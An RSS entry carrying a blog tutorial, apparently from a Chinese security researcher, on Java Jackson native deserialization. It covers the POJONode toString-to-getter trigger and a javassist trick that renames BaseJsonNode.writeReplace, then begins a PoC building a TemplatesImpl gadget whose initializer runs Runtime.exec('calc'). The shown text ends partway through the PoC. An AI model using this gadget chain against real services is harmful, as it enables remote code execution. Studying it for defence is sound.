<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>love hack • Posts by &#34;反序列化&#34; tag</title>
        <link>https://pr0phet1.github.io</link>
        <description></description>
        <language>en</language>
        <pubDate>Sat, 26 Jul 2025 12:58:08 +0800</pubDate>
        <lastBuildDate>Sat, 26 Jul 2025 12:58:08 +0800</lastBuildDate>
        <category>web</category>
        <category>go</category>
        <category>反序列化</category>
        <category>java</category>
        <item>
            <guid isPermalink="true">https://pr0phet1.github.io/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>jackson原生反序列化</title>
            <link>https://pr0phet1.github.io/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category>web</category>
            <category>反序列化</category>
            <category>java</category>
            <pubDate>Sat, 26 Jul 2025 12:58:08 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;jackson在序列化时会调用get方法，反序列化时会调用set方法&lt;br&gt;spring框架中内置的有jackson包，因此我们也需要学习jackson的相关序列化调用&lt;br&gt;在POJONode这一个类中，恰恰可以满足我们的触发条件，去触发get方法，具体看下文分析&lt;/p&gt;
&lt;p&gt;管理依赖&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.fasterxml.jackson.core&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;jackson-core&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.13.3&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.fasterxml.jackson.core&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;jackson-annotations&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.13.3&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.fasterxml.jackson.core&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;jackson-databind&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.13.3&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;POJONode&#34;&gt;&lt;a href=&#34;#POJONode&#34; class=&#34;headerlink&#34; title=&#34;POJONode&#34;&gt;&lt;/a&gt;POJONode&lt;/h1&gt;&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726102745276.png&#34; alt=&#34;image-20250726102745276&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726103655567.png&#34; alt=&#34;image-20250726103655567&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到在其父类BaseJsonNode类中，书写了toString方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726104101037.png&#34; alt=&#34;image-20250726104101037&#34;&gt;&lt;/p&gt;
&lt;p&gt;调用了InternalNodeMapper.nodeToString，执行了writeValueAsString，执行序列化对本身，这里的STD_WRITER这一常量，我们在追踪看下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726104646009.png&#34; alt=&#34;image-20250726104646009&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到这一常量就是JsonMapper.writer()的返回结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726105126127.png&#34; alt=&#34;image-20250726105126127&#34;&gt;&lt;/p&gt;
&lt;p&gt;JsonMapper.writer()返回ObjectWriter对象&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ObjectWriter&lt;/code&gt; 是 Jackson 中专门用于序列化对象的组件，它是从 &lt;code&gt;ObjectMapper&lt;/code&gt; 衍生出来的，可以提供更灵活的序列化配置&lt;/p&gt;
&lt;p&gt;说白了就是ObjectWriter可以简单理解为高配版的ObjectMapper序列化，作用不变&lt;/p&gt;
&lt;p&gt;那总结一下调用BaseJsonNode的toString方法相当于ObjectWriter,writeValueAsString(BaseJsonNode)&lt;/p&gt;
&lt;h1 id=&#34;报错原因&#34;&gt;&lt;a href=&#34;#报错原因&#34; class=&#34;headerlink&#34; title=&#34;报错原因&#34;&gt;&lt;/a&gt;报错原因&lt;/h1&gt;&lt;p&gt;可以看到停在了序列化writeObject&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726114504968.png&#34; alt=&#34;image-20250726114504968&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726120222881.png&#34; alt=&#34;image-20250726120222881&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后就抛出错误停止执行了，究其原因就是可以看到在POJONode的父类BaseJsonNode中具有writeReplace方法&lt;/p&gt;
&lt;h2 id=&#34;writeReplace&#34;&gt;&lt;a href=&#34;#writeReplace&#34; class=&#34;headerlink&#34; title=&#34;writeReplace&#34;&gt;&lt;/a&gt;writeReplace&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;在 Java 反序列化过程中，&lt;code&gt;writeReplace&lt;/code&gt; 方法是一个特殊的钩子方法，用于在对象被序列化时，替换当前对象。它定义在 &lt;code&gt;ObjectOutputStream&lt;/code&gt; 类中，方法签名是 &lt;code&gt;protected Object writeReplace()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;当对象被序列化时，如果该对象的类定义了 &lt;code&gt;writeReplace&lt;/code&gt; 方法，&lt;code&gt;ObjectOutputStream&lt;/code&gt; 会优先调用这个方法来获取一个替代对象，然后对这个替代对象进行序列化操作，而不是直接序列化原始对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用场景&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;对象的安全性增强&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;例如，假设有一个包含敏感信息（如密码等）的对象。在序列化这个对象时，我们不希望敏感信息被暴露。可以利用 &lt;code&gt;writeReplace&lt;/code&gt; 方法返回一个新的对象，这个新对象将敏感信息移除或者替换为安全的占位符。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优化序列化数据&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;有时候对象本身可能包含一些在序列化过程中不需要或者不适合存储的数据。通过 &lt;code&gt;writeReplace&lt;/code&gt; 方法可以返回一个简化后的对象用于序列化。&lt;/li&gt;
&lt;li&gt;例如，一个对象有一个很大的临时缓存数组，在序列化时可以不需要保存这个数组。就可以在 &lt;code&gt;writeReplace&lt;/code&gt; 方法中返回一个去掉了缓存数组的新对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;处理对象的引用问题&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;在某些情况下，同一个对象可能在多个地方被引用。为了优化序列化后的数据结构或者满足某些特殊的序列化需求，可以使用 &lt;code&gt;writeReplace&lt;/code&gt; 来替换对象，使得引用关系在序列化后得到重新组织。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;解决方式&#34;&gt;&lt;a href=&#34;#解决方式&#34; class=&#34;headerlink&#34; title=&#34;解决方式&#34;&gt;&lt;/a&gt;解决方式&lt;/h2&gt;&lt;p&gt;因为无法通过源码进行修改，我们可以通过反射直接将这个方法换成别的名字，简单粗暴，&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ClassPool&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;classPool&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; ClassPool.getDefault();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;classPool.insertClassPath(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ClassClassPath&lt;/span&gt;(AbstractTranslet.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;CtClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cc&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; classPool.makeClass(&lt;span class=&#34;string&#34;&gt;&amp;quot;Evil&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;String cmd= &lt;span class=&#34;string&#34;&gt;&amp;quot;java.lang.Runtime.getRuntime().exec(\&amp;quot;calc\&amp;quot;);&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cc.makeClassInitializer().insertBefore(cmd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//新增修改writeReplace方法名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;CtClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;ctClass&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; classPool.getCtClass(&lt;span class=&#34;string&#34;&gt;&amp;quot;com.fasterxml.jackson.databind.node.BaseJsonNode&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;CtMethod&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;writeReplace&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; ctClass.getDeclaredMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;writeReplace&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeReplace.setName(&lt;span class=&#34;string&#34;&gt;&amp;quot;propeht&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//JVM加载修改后的类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctClass.toClass();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;poc&#34;&gt;&lt;a href=&#34;#poc&#34; class=&#34;headerlink&#34; title=&#34;poc&#34;&gt;&lt;/a&gt;poc&lt;/h1&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; javax.management.BadAttributeValueExpException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.fasterxml.jackson.databind.node.BaseJsonNode;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.fasterxml.jackson.databind.node.POJONode;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; groovy.transform.Undefined;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; javassist.ClassClassPath;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; javassist.ClassPool;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; javassist.CtClass;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; javassist.CtMethod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.FileOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.FileInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Field;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Method;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;poc&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//使用javassist定义恶意代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ClassPool&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;classPool&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; ClassPool.getDefault();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        classPool.insertClassPath(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ClassClassPath&lt;/span&gt;(AbstractTranslet.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;CtClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cc&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; classPool.makeClass(&lt;span class=&#34;string&#34;&gt;&amp;quot;Evil&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String cmd= &lt;span class=&#34;string&#34;&gt;&amp;quot;java.lang.Runtime.getRuntime().exec(\&amp;quot;calc\&amp;quot;);&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cc.makeClassInitializer().insertBefore(cmd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        